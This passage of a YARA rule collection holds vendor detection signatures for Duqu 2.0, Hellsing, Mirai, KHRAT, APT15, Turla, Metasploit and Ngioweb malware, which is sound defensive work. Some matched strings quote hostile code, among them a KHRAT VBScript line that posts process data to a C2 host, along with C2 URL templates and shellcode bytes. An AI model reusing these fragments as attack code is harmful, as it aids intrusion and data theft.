		$x3 = "SEOUL1" fullword ascii
	condition:
		( 1 of ($s*) and 2 of ($x*) ) or
		( 3 of ($x*) )
}

rule APT_apt_duqu2_loaders {
	meta:
		copyright = "Kaspersky Lab"
		description = "Rule to detect Duqu 2.0 samples"
		last_modified = "2015-06-09"
		version = "1.0"
		id = "22db52c2-18e7-537e-a9c5-38ccfd3a0d30"
	strings:
		$a1 = "{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
		$a2 = "\\\\.\\pipe\\{AAFFC4F0-E04B-4C7C-B40A-B45DE971E81E}" wide
		$a4 = "\\\\.\\pipe\\{AB6172ED-8105-4996-9D2A-597B5F827501}" wide
		$a5 = "Global\\{B54E3268-DE1E-4c1e-A667-2596751403AD}" wide
		$a8 = "SELECT `Data` FROM `Binary` WHERE `Name`='%s%i'" wide
		$a9 = "SELECT `Data` FROM `Binary` WHERE `Name`='CryptHash%i'" wide
		$a7 = "SELECT `%s` FROM `%s` WHERE `%s`='CAData%i'" wide
		$b1 = "MSI.dll"
		$b2 = "msi.dll"
		$b3 = "StartAction"
		$c1 = "msisvc_32@" wide
		$c2 = "PROP=" wide
		$c3 = "-Embedding" wide
		$c4 = "S:(ML;;NW;;;LW)" wide
		$d1 = "NameTypeBinaryDataCustomActionActionSourceTargetInstallExecuteSequenceConditionSequencePropertyValueMicrosoftManufacturer" nocase
		$d2 = {2E 3F 41 56 3F 24 5F 42 69 6E 64 40 24 30 30 58 55 3F 24 5F 50 6D 66 5F 77 72 61 70 40 50 38 43 4C 52 ?? 40 40 41 45 58 58 5A 58 56 31 40 24 24 24 56 40 73 74 64 40 40 51 41 56 43 4C 52 ?? 40 40 40 73 74 64 40 40}
	condition:
		( (uint16(0) == 0x5a4d) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) ) and filesize < 100000 )
		or
		( (uint32(0) == 0xe011cfd0) and ( (any of ($a*)) or (all of ($b*)) or (all of ($c*)) or (any of ($d*)) ) and filesize < 20000000 )
}

rule FE_Trojan_SH_ATRIUM_1
{
    meta:
        author = "Mandiant"
        date = "2021-04-16"
        hash = "a631b7a8a11e6df3fccb21f4d34dbd8a"
        description = "Detects samples mentioned in PulseSecure report"
        reference = "https://www.fireeye.com/blog/threat-research/2021/04/suspected-apt-actors-leverage-bypass-techniques-pulse-secure-zero-day.html"
        id = "c49441f4-a138-534c-a858-a7462ed865c9"
    strings:
        $s1 = "CGI::param("
        $s2 = "Cache-Control: no-cache"
        $s3 = "system("
        $s4 = /sed -i [^\r\n]{1,128}CGI::param\([^\r\n]{1,128}print[\x20\x09]{1,32}[^\r\n]{1,128}Cache-Control: no-cache[^\r\n]{1,128}print[\x20\x09]{1,32}[^\r\n]{1,128}Content-type: text\/html[^\r\n]{1,128}my [^\r\n]{1,128}=[\x09\x20]{0,32}CGI::param\([^\r\n]{1,128}system\(/
    condition:
        all of them
}

rule apt_hellsing_implantstrings { 
	meta:
		version = "1.0"
		filetype = "PE"
		author = "Costin Raiu, Kaspersky Lab" 
		copyright = "Kaspersky Lab"
		date = "2015-04-07"
		description = "detection for Hellsing implants"
		id = "00aa5885-ae79-5d68-8587-13d3e8965630"
	strings: 
		$a1 = "the file uploaded failed !"
		$a2 = "ping 127.0.0.1"
		$b1 = "the file downloaded failed !"
		$b2 = "common.asp"
		$c = "xweber_server.exe" 
		$d = "action="
		$debugpath1 = "d:\\Hellsing\\release\\msger\\" nocase 
		$debugpath2 = "d:\\hellsing\\sys\\xrat\\" nocase 
		$debugpath3 = "D:\\Hellsing\\release\\exe\\" nocase 
		$debugpath4 = "d:\\hellsing\\sys\\xkat\\" nocase 
		$debugpath5 = "e:\\Hellsing\\release\\clare" nocase 
		$debugpath6 = "e:\\Hellsing\\release\\irene\\" nocase 
		$debugpath7 = "d:\\hellsing\\sys\\irene\\" nocase
		$e = "msger_server.dll" 
		$f = "ServiceMain"
	condition:
		uint16(0) == 0x5a4d and (all of ($a*)) or (all of ($b*)) or ($c and $d) or (any of ($debugpath*)) or ($e and $f) and filesize < 500000
}

rule apt_hellsing_proxytool { 
	meta:
		version = "1.0"
		filetype = "PE"
		author = "Costin Raiu, Kaspersky Lab"
		copyright = "Kaspersky Lab"
		date = "2015-04-07"
		description = "detection for Hellsing proxy testing tool"
		id = "54454f07-11a9-5456-b489-9a9610e53123"
	strings: 
		$a1 = "PROXY_INFO: automatic proxy url => %s"
		$a2 = "PROXY_INFO: connection type => %d"
		$a3 = "PROXY_INFO: proxy server => %s"
		$a4 = "PROXY_INFO: bypass list => %s"
		$a5 = "InternetQueryOption failed with GetLastError() %d"
		$a6 = "D:\\Hellsing\\release\\exe\\exe\\" nocase
	condition:
		uint16(0) == 0x5a4d and (2 of ($a*)) and filesize < 300000
}

rule apt_hellsing_xkat { 
	meta:
		version = "1.0"
		filetype = "PE"
		author = "Costin Raiu, Kaspersky Lab" copyright = "Kaspersky Lab"
		date = "2015-04-07"
		description = "detection for Hellsing xKat tool"
		id = "c831ce04-8fb2-5790-8aaf-c88b370835ac"
	strings: 
		$a1 = "\\Dbgv.sys" $a2="XKAT_BIN" $a3="release sys file error."
		$a4 = "driver_load error. "
		$a5 = "driver_create error."
		$a6 = "delete file:%s error." 
		$a7 = "delete file:%s ok."
		$a8 = "kill pid:%d error."
		$a9 = "kill pid:%d ok."
		$a10 = "-pid-delete"
		$a11 = "kill and delete pid:%d error."
		$a12 = "kill and delete pid:%d ok."
	condition:
		uint16(0) == 0x5a4d and (6 of ($a*)) and filesize < 300000
}

rule apt_hellsing_msgertype2 { 
	meta:
		version = "1.0"
		filetype = "PE"
		author = "Costin Raiu, Kaspersky Lab"
		copyright = "Kaspersky Lab"
		date = "2015-04-07"
		description = "detection for Hellsing msger type 2 implants"
		id = "98f151de-c1c2-56c1-8c64-5d1f437e0742"
	strings: 
		$a1 = "%s\\system\\%d.txt"
		$a2 = "_msger" 
		$a3 = "http://%s/lib/common.asp?action=user_login&uid=%s&lan=%s&host=%s&os=%s&proxy=%s"
		$a4 = "http://%s/data/%s.1000001000" 
		$a5 = "/lib/common.asp?action=user_upload&file="
		$a6 = "%02X-%02X-%02X-%02X-%02X-%02X"
	condition:
		uint16(0) == 0x5a4d and (4 of ($a*)) and filesize < 500000
}

rule apt_hellsing_irene { 
	meta:
		version = "1.0"
		filetype = "PE"
		author = "Costin Raiu, Kaspersky Lab"
		copyright = "Kaspersky Lab"
		date = "2015-04-07"
		description = "detection for Hellsing msger irene installer"
		id = "b57d1a10-4e5c-511f-b98c-8ce7d766c227"
	strings: 
		$a1 = "\\Drivers\\usbmgr.tmp" wide
		$a2 = "\\Drivers\\usbmgr.sys" wide
		$a3 = "common_loadDriver CreateFile error!"
		$a4 = "common_loadDriver StartService error && GetLastError():%d!"
		$a5 = "irene" wide
		$a6 = "aPLib v0.43 - the smaller the better" 
	condition:
		uint16(0) == 0x5a4d and (4 of ($a*)) and filesize < 500000
}

rule Miari_2_May17 {
   meta:
      description = "Detects Mirai Malware"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "Internal Research"
      date = "2017-05-12"
      super_rule = 1
      hash1 = "9ba8def84a0bf14f682b3751b8f7a453da2cea47099734a72859028155b2d39c"
      hash2 = "a393449a5f19109160384b13d60bb40601af2ef5f08839b5223f020f1f83e990"
      id = "1c2cc98d-8ca5-5055-8f86-7f85c046ccd9"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36" fullword ascii
      $s2 = "GET /g.php HTTP/1.1" fullword ascii
      $s3 = "https://%[^/]/%s" fullword ascii
      $s4 = "pass\" value=\"[^\"]*\"" fullword ascii
      $s5 = "jbeupq84v7.2y.net" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 5000KB and 2 of them )
}

rule Malware_QA_update {
	meta:
		description = "VT Research QA uploaded malware - file update.exe"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "VT Research QA"
		date = "2016-08-29"
		score = 80
		hash1 = "6d805533623d7063241620eec38b7eb9b625533ccadeaf4f6c2cc6db32711541"
		hash2 = "6415b45f5bae6429dd5d92d6cae46e8a704873b7090853e68e80cd179058903e"
		id = "1dce684d-33b0-5588-8325-2a34c0cde32f"
	strings:
		$x1 = "UnActiveOfflineKeylogger" fullword ascii
		$x2 = "BTRESULTDownload File|Mass Download : File Downloaded , Executing new one in temp dir...|" fullword ascii
		$x3 = "ActiveOnlineKeylogger" fullword ascii
		$x4 = "C:\\Users\\DarkCoderSc\\" ascii
		$x5 = "Celesty Binder\\Stub\\STATIC\\Stub.pdb" ascii
		$x6 = "BTRESULTUpdate from URL|Update : File Downloaded , Executing new one in temp dir...|" fullword ascii

		$s1 = "MSRSAAP.EXE" fullword wide
		$s2 = "Command successfully executed!|" fullword ascii
		$s3 = "BTMemoryLoadLibary: Get DLLEntyPoint failed" fullword ascii
		$s4 = "I wasn't able to open the hosts file, maybe because UAC is enabled in remote computer!" fullword ascii
		$s5 = "\\Internet Explorer\\iexplore.exe" ascii
		$s6 = "ping 127.0.0.1 -n 4 > NUL && \"" fullword ascii
		$s7 = "BTMemoryGetProcAddress: DLL doesn't export anything" fullword ascii
		$s8 = "POST /index.php/1.0" fullword ascii
	condition:
		( uint16(0) == 0x5a4d and filesize < 3000KB and ( 1 of ($x*) or 3 of ($s*) ) )
		or ( all of them )
}

rule ConnectWise_ScreenConnect_Authentication_Bypass_Feb_2024_Exploitation_IIS_Logs {
   meta:
      description = "Detects an http request to '/SetupWizard.aspx/' with anything following it, which when found in IIS logs is a potential indicator of compromise of the 2024 ConnectWise ScreenConnect (versions prior to 23.9.8) vulnerability that allows an Authentication Bypass"
      author = "Huntress DE&TH Team (modified by Florian Roth)"
      reference = "https://www.connectwise.com/company/trust/security-bulletins/connectwise-screenconnect-23.9.8"
      date = "2024-02-20"
      modified = "2024-02-21"
      id = "2886530b-e164-4c4b-b01e-950e3c40acb4"
   strings:
      $s1 = " GET /SetupWizard.aspx/" ascii
      $s2 = " POST /SetupWizard.aspx/" ascii
      $s3 = " PUT /SetupWizard.aspx/" ascii
      $s4 = " HEAD /SetupWizard.aspx/" ascii
   condition:
      1 of them
}

rule MAL_KHRAT_scritplet {
   meta:
      description = "Rule derived from KHRAT scriptlet"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://researchcenter.paloaltonetworks.com/2017/08/unit42-updated-khrat-malware-used-in-cambodia-attacks/"
      date = "2017-08-31"
      hash1 = "cdb9104636a6f7c6018fe99bc18fb8b542689a84c23c10e9ea13d5aa275fd40e"
      id = "f72d68a3-0409-5401-b6a1-ca8f188d7409"
   strings:
      $x1 = "http.open \"POST\", \"http://update.upload-dropbox[.]com/docs/tz/GetProcess.php\",False,\"\",\"\" " fullword ascii
      $x2 = "Process=Process & Chr(32) & Chr(32) & Chr(32) & Obj.Description" fullword ascii

      $s1 = "http.SetRequestHeader \"Content-Type\", \"application/json\" " fullword ascii
      $s2 = "Dim http,WMI,Objs,Process" fullword ascii
      $s3 = "Set Objs=WMI.InstancesOf(\"Win32_Process\")" fullword ascii
      $s4 = "'WScript.Echo http.responseText " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and ( 1 of ($x*) or 4 of them )
}

rule EXT_APT_Bitter_Win32k_0day_Feb21 {
   meta:
      description = "Detects code that exploits a Windows 0day exploited by Bitter APT group"
      author = "dbappsecurity_lieying_lab"
      date = "2021-01-01"
      reference = "https://ti.dbappsecurity.com.cn/blog/index.php/2021/02/10/windows-kernel-zero-day-exploit-is-used-by-bitter-apt-in-targeted-attack/"
      id = "b1892b52-4b94-5571-ad63-8750a321f1f2"
   strings:
      $s1 = "NtUserConsoleControl" ascii wide
      $s2 = "NtCallbackReturn" ascii wide
      $s3 = "CreateWindowEx" ascii wide
      $s4 = "SetWindowLong" ascii wide

      $a1 = {48 C1 E8 02 48 C1 E9 02 C7 04 8A}
      $a2 = {66 0F 1F 44 00 00 80 3C 01 E8 74 22 FF C2 48 FF C1}
      $a3 = {48 63 05 CC 69 05 00 8B 0D C2 69 05 00 48 C1 E0 20 48 03 C1}

   condition:
      uint16(0) == 0x5a4d and all of ($s*) and 1 of ($a*)
}

rule APT15_Malware_Mar18_BS2005 {
   meta:
      description = "Detects malware from APT 15 report by NCC Group"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://goo.gl/HZ5XMN"
      date = "2018-03-10"
      hash1 = "750d9eecd533f89b8aa13aeab173a1cf813b021b6824bc30e60f5db6fa7b950b"
      id = "700bbe14-d79e-5a35-aab3-31eacd5bd950"
   strings:
      $x1 = "AAAAKQAASCMAABi+AABnhEBj8vep7VRoAEPRWLweGc0/eiDrXGajJXRxbXsTXAcZAABK4QAAPWwAACzWAAByrg==" fullword ascii
      $x2 = "AAAAKQAASCMAABi+AABnhKv3kXJJousn5YzkjGF46eE3G8ZGse4B9uoqJo8Q2oF0AABK4QAAPWwAACzWAAByrg==" fullword ascii

      $a1 = "http://%s/content.html?id=%s" fullword ascii
      $a2 = "http://%s/main.php?ssid=%s" fullword ascii
      $a3 = "http://%s/webmail.php?id=%s" fullword ascii
      $a9 = "http://%s/error.html?tab=%s" fullword ascii

      $s1 = "%s\\~tmp.txt" fullword ascii
      $s2 = "%s /C %s >>\"%s\" 2>&1" fullword ascii
      $s3 = "DisableFirstRunCustomize" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and (
         1 of ($x*) or
         2 of them
      )
}

rule TurlaMosquito_Mal_6 {
   meta:
      description = "Detects malware sample from Turla Mosquito report"
      license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
      author = "Florian Roth (Nextron Systems)"
      reference = "https://www.welivesecurity.com/wp-content/uploads/2018/01/ESET_Turla_Mosquito.pdf"
      date = "2018-02-22"
      hash1 = "b79cdf929d4a340bdd5f29b3aeccd3c65e39540d4529b64e50ebeacd9cdee5e9"
      id = "1c320b60-ec7a-5f87-b871-f55924351f8f"
   strings:
      $a1 = "/scripts/m/query.php?id=" fullword wide
      $a2 = "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36" fullword wide
      $a3 = "GetUserNameW fails" fullword wide

      $s1 = "QVSWQQ" fullword ascii
      $s2 = "SRRRQP" fullword ascii
      $s3 = "QSVVQQ" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and (
         2 of ($a*) or
         4 of them
      )
}

rule Explosion_Generic_1 {
	meta:
		description = "Generic Rule for Explosion/Explosive Malware - Volatile Cedar APT"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"
		author = "Florian Roth (Nextron Systems)"
		reference = "not set"
		date = "2015/04/03"
		score = 70
		super_rule = 1
		hash0 = "d0f059ba21f06021579835a55220d1e822d1233f95879ea6f7cb9d301408c821"
		hash1 = "1952fa94b582e9af9dca596b5e51c585a78b8b1610639e3b878bbfa365e8e908"
		hash2 = "d8fdcdaad652c19f4f4676cd2f89ae834dbc19e2759a206044b18601875f2726"
		hash3 = "e2e6ed82703de21eb4c5885730ba3db42f3ddda8b94beb2ee0c3af61bc435747"
		hash4 = "03641e5632673615f23b2a8325d7355c4499a40f47b6ae094606a73c56e24ad0"
		id = "dc3721b6-c19e-5449-9962-2a6f844e49b4"
	strings:
		$s0 = "autorun.exe" fullword
		$s1 = "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; MSIE 6.0; Windows NT 5.1; .NET CL"
		$s2 = "%drp.exe" fullword
		$s3 = "%s_%s%d.exe" fullword
		$s4 = "open=autorun.exe" fullword
		$s5 = "http://www.microsoft.com/en-us/default.aspx" fullword
		$s10 = "error.renamefile" fullword
		$s12 = "insufficient lookahead" fullword
		$s13 = "%s %s|" fullword
		$s16 = ":\\autorun.exe" fullword
	condition:
		7 of them and
        uint16(0) == 0x5A4D
}

rule Windows_Trojan_Metasploit_38b8ceec {
    meta:
        author = "Elastic Security"
        id = "38b8ceec-601c-4117-b7a0-74720e26bf38"
        fingerprint = "44b9022d87c409210b1d0807f5a4337d73f19559941660267d63cd2e4f2ff342"
        creation_date = "2021-03-23"
        last_modified = "2021-08-23"
        description = "Identifies the API address lookup function used by metasploit. Also used by other tools (like beacon)."
        threat_name = "Windows.Trojan.Metasploit"
        severity = 85
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = { 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF 31 C0 AC 3C 61 }
    condition:
        $a1
}

rule Windows_Trojan_Metasploit_dd5ce989 {
    meta:
        author = "Elastic Security"
        id = "dd5ce989-3925-4e27-97c1-3b8927c557e9"
        fingerprint = "4fc7c309dca197f4626d6dba8afcd576e520dbe2a2dd6f7d38d7ba33ee371d55"
        creation_date = "2021-04-14"
        last_modified = "2021-08-23"
        description = "Identifies Meterpreter DLL used by Metasploit"
        threat_name = "Windows.Trojan.Metasploit"
        reference = "https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/"
        reference_sample = "86cf98bf854b01a55e3f306597437900e11d429ac6b7781e090eeda3a5acb360"
        severity = 90
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = "metsrv.x64.dll" fullword
        $a2 = "metsrv.dll" fullword
        $b1 = "ReflectiveLoader"
    condition:
        1 of ($a*) and 1 of ($b*)
}

rule Windows_Trojan_Metasploit_96233b6b {
    meta:
        author = "Elastic Security"
        id = "96233b6b-d95a-4e0e-8f83-f2282a342087"
        fingerprint = "40032849674714bc9eb020971dd9f27a07b53b8ff953b793cb3aad136256fd70"
        creation_date = "2021-06-10"
        last_modified = "2021-08-23"
        description = "Identifies another 64 bit API hashing function used by Metasploit."
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "e7a2d966deea3a2df6ce1aeafa8c2caa753824215a8368e0a96b394fb46b753b"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { 89 E5 31 D2 64 8B 52 30 8B 52 0C 8B 52 14 8B 72 28 31 FF 0F B7 4A 26 31 C0 AC 3C 61 7C 02 2C 20 C1 CF 0D }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_91bc5d7d {
    meta:
        author = "Elastic Security"
        id = "91bc5d7d-31e3-4c02-82b3-a685194981f3"
        fingerprint = "8848a3de66a25dd98278761a7953f31b7995e48621dec258f3d92bd91a4a3aa3"
        creation_date = "2021-08-02"
        last_modified = "2021-10-04"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "0dd993ff3917dc56ef02324375165f0d66506c5a9b9548eda57c58e041030987"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { 49 BE 77 73 32 5F 33 32 00 00 41 56 49 89 E6 48 81 EC A0 01 00 00 49 89 E5 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_a91a6571 {
    meta:
        author = "Elastic Security"
        id = "a91a6571-ae2d-4ab4-878b-38b455f42c01"
        fingerprint = "e372484956eab80e4bf58f4ae1031de705cb52eaefa463aa77af7085c463638d"
        creation_date = "2022-06-08"
        last_modified = "2022-09-29"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "ff7795edff95a45b15b03d698cbdf70c19bc452daf4e2d5e86b2bbac55494472"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { FC 48 83 E4 F0 E8 CC 00 00 00 41 51 41 50 52 48 31 D2 51 56 65 48 8B 52 60 48 8B 52 18 48 8B 52 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_b29fe355 {
    meta:
        author = "Elastic Security"
        id = "b29fe355-b7f8-4325-bf06-7975585f3888"
        fingerprint = "a943325b7a227577ccd45748b4e705288c5b7d91d0e0b2a115daeea40e1a2148"
        creation_date = "2022-06-08"
        last_modified = "2022-09-29"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "4f0ab4e42e6c10bc9e4a699d8d8819b04c17ed1917047f770dc6980a0a378a68"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = "%04x-%04x:%s" fullword
        $a2 = "\\\\%s\\pipe\\%s" fullword
        $a3 = "PACKET TRANSMIT" fullword
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_66140f58 {
    meta:
        author = "Elastic Security"
        id = "66140f58-1815-4e21-8544-24fed74194f1"
        fingerprint = "79879b2730e98f3eddeca838dff438d75a43ac20c0da6a4802474ff05f9cc7a3"
        creation_date = "2022-08-15"
        last_modified = "2022-09-29"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "01a0c5630fbbfc7043d21a789440fa9dadc6e4f79640b370f1a21c6ebf6a710a"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { FC 48 83 E4 F0 E8 CC 00 00 00 41 51 41 50 52 48 31 D2 51 65 48 8B 52 60 48 8B 52 18 48 8B 52 20 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_2092c42a {
    meta:
        author = "Elastic Security"
        id = "2092c42a-793b-4b0e-868b-9a39c926f44c"
        fingerprint = "4f17bfb02d3ac97e48449b6e30c9b07f604c13d5e12a99af322853c5d656ee88"
        creation_date = "2023-05-09"
        last_modified = "2023-06-13"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "e47d88c11a89dcc84257841de0c9f1ec388698006f55a0e15567354b33f07d3c"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = { 65 6E 61 62 6C 65 5F 6B 65 79 62 6F 61 72 64 5F 69 6E 70 75 74 }
        $a2 = { 01 04 10 49 83 C2 02 4D 85 C9 75 9C 41 8B 43 04 4C 03 D8 48 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_46e1c247 {
    meta:
        author = "Elastic Security"
        id = "46e1c247-1ebb-434f-835f-faf421b35169"
        fingerprint = "6cd37d32976add38d7165f8088f38f4854b59302d6adf20db5c46cd3e8c7d9e7"
        creation_date = "2023-05-10"
        last_modified = "2023-06-13"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "ef70e1faa3b1f40d92b0a161c96e13c96c43ec6651e7c87ee3977ed07b950bab"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = { 73 74 64 61 70 69 5F 66 73 5F 66 69 6C 65 }
        $a2 = { 85 D2 74 0E 8B F3 2B 75 F8 8A 01 88 04 0E 41 4A 75 F7 0F B7 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_b62aac1e {
    meta:
        author = "Elastic Security"
        id = "b62aac1e-2ce8-4803-90ee-138b509e814d"
        fingerprint = "58340ea67e2544d22adba3317350150c61c84fba1d16c7c9f8d0c626c3421296"
        creation_date = "2023-05-10"
        last_modified = "2023-06-13"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "af9af81f7e46217330b447900f80c9ce38171655becb3b63e51f913b95c71e70"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = { 42 3C 8B AC 10 88 00 00 00 44 8B 54 15 20 44 8B 5C 15 24 4C }
        $a2 = { CB 4D 85 D2 74 10 41 8A 00 4D 03 C3 88 02 49 03 D3 4D 2B D3 }
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_47f5d54a {
    meta:
        author = "Elastic Security"
        id = "47f5d54a-2578-4bbd-b157-8b225f6d34b3"
        fingerprint = "b6dbc1b273bc9a328d5c437d11db23e8f1d3bf764bb624aa4f552c14b3dc5260"
        creation_date = "2023-11-13"
        last_modified = "2024-01-12"
        threat_name = "Windows.Trojan.Metasploit"
        reference_sample = "bc3754cf4a04491a7ad7a75f69dd3bb2ddf0d8592ce078b740d7c9c7bc85a7e1"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a32 = { 89 45 F8 FF 15 [11] 8B D8 85 DB 74 76 6A 00 6A 04 6A 00 FF 35 [4] 6A 00 6A 00 FF 15 }
        $a64 = { 48 89 7C 24 48 FF 15 [4] 33 D2 44 8B C0 B9 40 00 10 00 FF 15 [4] 48 8B F8 48 85 C0 74 55 48 8B 15 [10] 4C 8B C0 48 8B CB 48 C7 44 24 20 }
    condition:
        any of them
}

rule Windows_Trojan_Metasploit_0cc81460 {
    meta:
        author = "Elastic Security"
        id = "0cc81460-f4bf-4f7d-952d-49396ac0d3e0"
        fingerprint = "96651309f4b9b1643cf49086411562510182a9b777b167ff64792734df2eb294"
        creation_date = "2025-05-02"
        last_modified = "2025-05-27"
        threat_name = "Windows.Trojan.Metasploit"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a1 = /\x64\x8B\x52\x30.{1,30}\x7C\x02\x2C\x20\xC1\xCF\x0D.{40,80}\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE0/
    condition:
        all of them
}

rule Windows_Trojan_Metasploit_1ca1e384 {
    meta:
        author = "Elastic Security"
        id = "1ca1e384-267b-49d8-ab4c-fb311892a07c"
        fingerprint = "a04268061fc4680058a374ede37f91aa8b85a06da67a4c4d81dae256c72e25db"
        creation_date = "2025-05-02"
        last_modified = "2025-05-27"
        threat_name = "Windows.Trojan.Metasploit"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "windows"
    strings:
        $a = { 48 01 D0 66 81 78 18 0B 02 0F 85 72 00 00 00 8B 80 88 00 00 00 48 85 C0 74 67 48 01 D0 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_8bd3002c {
    meta:
        author = "Elastic Security"
        id = "8bd3002c-d9c7-4f93-b7f0-4cb9ba131338"
        fingerprint = "2ee5432cf6ead4eca3aad70e40fac7e182bdcc74dc22dc91a12946ae4182f1ab"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "5480bc02aeebd3062e6d19e50a5540536ce140d950327cce937ff7e71ebd15e2"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 24 18 67 8A 09 84 C9 74 0D 80 F9 2E 75 02 FF C0 FF 44 24 18 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_a592a280 {
    meta:
        author = "Elastic Security"
        id = "a592a280-053f-47bc-8d74-3fa5d74bd072"
        fingerprint = "60f5ddd115fa1abac804d2978bbb8d70572de0df9da80686b5652520c03bd1ee"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "5480bc02aeebd3062e6d19e50a5540536ce140d950327cce937ff7e71ebd15e2"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 75 06 8B 7C 24 2C EB 2C 83 FD 01 75 06 8B 7C 24 3C EB 21 83 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_d57aa841 {
    meta:
        author = "Elastic Security"
        id = "d57aa841-8eb5-4765-9434-233ab119015f"
        fingerprint = "83a4eb7c8ac42097d3483bcf918823105b4ea4291a566b4184eacc2a0f3aa3a4"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "555d60bd863caff231700c5f606d0034d5aa8362862d1fd0c816615d59f582f7"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 24 0C 48 89 4C 24 10 4C 89 44 24 18 66 83 F8 02 74 10 BB 10 00 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_b97e0253 {
    meta:
        author = "Elastic Security"
        id = "b97e0253-497f-4c2c-9d4c-ad89af64847f"
        fingerprint = "859f29acec8bb05b8a8e827af91e927db0b2390410179a0f5b03e7f71af64949"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "5480bc02aeebd3062e6d19e50a5540536ce140d950327cce937ff7e71ebd15e2"
        severity = 100
        arch_context = "x86"
        scan_context = "file, memory"
        license = "Elastic License v2"
        os = "linux"
    strings:
        $a = { 41 5C 41 5D 41 5E 41 5F C3 67 0F BE 17 39 F2 74 12 84 D2 74 04 }
    condition:
        all of them
}

rule Linux_Trojan_Ngioweb_66c465a0 {
    meta:
        author = "Elastic Security"
        id = "66c465a0-821d-43ea-82f5-fe787720bfbf"
        fingerprint = "e26071afff71506236b261a44e8f1903d348dd33b95597458649f377710492f4"
        creation_date = "2021-01-12"
        last_modified = "2021-09-16"
        threat_name = "Linux.Trojan.Ngioweb"
        reference_sample = "7454ee074812d7fa49044de8190e17b5034b3f08625f547d1b04aae4054fd81a"
        severity = 100
        arch_context = "x86"
